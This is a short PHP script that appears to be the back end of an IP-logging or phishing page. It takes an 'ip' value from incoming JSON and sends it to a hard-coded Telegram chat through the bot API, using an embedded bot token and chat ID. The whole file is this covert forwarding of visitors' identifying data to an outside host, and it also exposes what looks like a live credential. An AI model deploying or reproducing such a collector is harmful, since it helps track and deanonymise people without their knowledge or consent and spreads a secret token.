<?php
$bot="8115511840:AAGVUq9oDuh4ut9CHy-vrkCAfnyiFsJMj6I";
$chat="-1003590550415";

$data=json_decode(file_get_contents("php://input"),true);

$msg="IP Address:\n".$data['ip'];

file_get_contents("https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat&text=$msg");
?>